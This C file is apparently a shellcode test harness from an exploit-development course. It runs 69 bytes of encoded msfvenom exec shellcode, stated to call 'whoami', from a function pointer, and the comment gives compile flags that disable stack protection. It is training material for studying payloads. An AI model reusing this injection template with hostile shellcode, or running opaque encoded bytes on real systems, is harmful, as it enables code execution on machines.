/*
Tested on       : Linux/x86
Author          : Elham AlShehri
ID              : SLAE-1538
Shellcode Size  : 69 bytes ( Null-free )
Description     : linux/x86/exec shellcode test ( CMD=whoami )

Test Using:
        gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
*/
#include<stdio.h>
#include<string.h>

// msfvenom -p linux/x86/exec CMD=whoami -b "\x00" -f c -v shellcode
unsigned char shellcode[] = 
"\xd9\xeb\xd9\x74\x24\xf4\xb8\x05\x91\x3a\xf0\x5d\x29\xc9\xb1"
"\x0b\x83\xed\xfc\x31\x45\x15\x03\x45\x15\xe7\x64\x50\xfb\xbf"
"\x1f\xf7\x9d\x57\x0d\x9b\xe8\x40\x25\x74\x98\xe6\xb6\xe2\x71"
"\x94\xdf\x9c\x04\xbb\x72\x89\x10\x3b\x73\x49\x68\x53\x1c\x28"
"\xfb\xca\xe2\xfd\x50\x85\x02\xcc\xd7";


int main(int argc, char *argv[])
{
	printf("Shellcode Length:  %d\n", strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}
